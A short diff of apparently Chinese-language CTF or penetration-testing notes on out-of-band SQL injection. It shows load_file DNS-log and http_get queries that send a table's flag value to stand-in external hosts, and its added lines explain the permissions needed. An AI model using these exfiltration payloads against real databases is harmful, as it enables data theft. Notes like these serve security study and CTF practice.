@@ -18,3 +18,5 @@ select load_file(concat('\\\\',(select flag from `191981093114514`),'.xxx.dnslog
 HTTP注入:
 select http_get(concat('http://xxx.vps.com/?data=',(select flag from `191981093114514`)));
 需高权限和80/443端口开启以及允许创建自定义函数
+http_get通过创建库来执行http外联功能,所以需要创建自定义函数权限
+Windows和Linux都可以使用
